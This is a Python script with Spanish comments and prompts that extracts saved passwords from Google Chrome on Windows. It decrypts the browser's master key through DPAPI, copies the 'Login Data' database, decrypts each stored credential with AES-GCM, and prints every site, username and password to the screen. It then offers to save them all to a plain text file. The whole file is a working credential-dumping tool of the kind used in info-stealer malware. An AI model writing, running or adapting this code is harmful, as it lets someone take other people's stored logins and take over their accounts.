import os
import json
import base64
import sqlite3
import win32crypt
import shutil
from Crypto.Cipher import AES
def get_encryption_key():
    """
    Obtiene la clave de cifrado utilizada por Chrome para proteger las contraseñas almacenadas.
    """
    local_state_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "Local State")
    with open(local_state_path, "r", encoding="utf-8") as f:
        local_state = json.load(f)
    encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    key = win32crypt.CryptUnprotectData(encrypted_key[5:], None, None, None, 0)[1]
    return key

def decrypt_password(password, key):
    """
    Descifra la contraseña cifrada utilizando la clave de cifrado proporcionada.
    """
    try:
        iv = password[3:15]
        password = password[15:]
        cipher = AES.new(key, AES.MODE_GCM, iv)
        decrypted_password = cipher.decrypt(password)[:-16].decode()
        return decrypted_password
    except Exception as e:
        print(f"Error decrypting password: {e}")
        return ""
def save_passwords_to_file(passwords):
    """
    Guarda las contraseñas en un archivo de texto.
    """
    filename = "chrome_passwords.txt"
    with open(filename, "w") as file:
        for password_info in passwords:
            file.write(f"Origin URL: {password_info['origin_url']}\n")
            file.write(f"Username: {password_info['username']}\n")
            file.write(f"Password: {password_info['password']}\n\n")
    print(f"Las contraseñas se han guardado en el archivo: {filename}")
def main():
    try:
        key = get_encryption_key()
        db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "default", "Login Data")
        filename = "ChromeData3.db"
        shutil.copyfile(db_path, filename)
        db = sqlite3.connect(filename)
        cursor = db.cursor()
        cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
        passwords = []
        for row in cursor.fetchall():
            origin_url, username, password = row
            decrypted_password = decrypt_password(password, key)
            if username or decrypted_password:
                passwords.append({
                    'origin_url': origin_url,
                    'username': username,
                    'password': decrypted_password
                })
        if not passwords:
            print("No se encontraron contraseñas almacenadas en la base de datos de Chrome.")
        else:
            print(f"Se encontraron {len(passwords)} contraseñas almacenadas:")
            for password_info in passwords:
                print(f"Origin URL: {password_info['origin_url']}")
                print(f"Username: {password_info['username']}")
                print(f"Password: {password_info['password']}")
            save_option = input("¿Desea guardar las contraseñas en un archivo de texto? (s/n): ")
            if save_option.lower() == 's':
                save_passwords_to_file(passwords)
        db.close()
        os.remove(filename)
    except Exception as e:
        print(f"An error occurred: {e}")

if __name__ == "__main__":
    main()
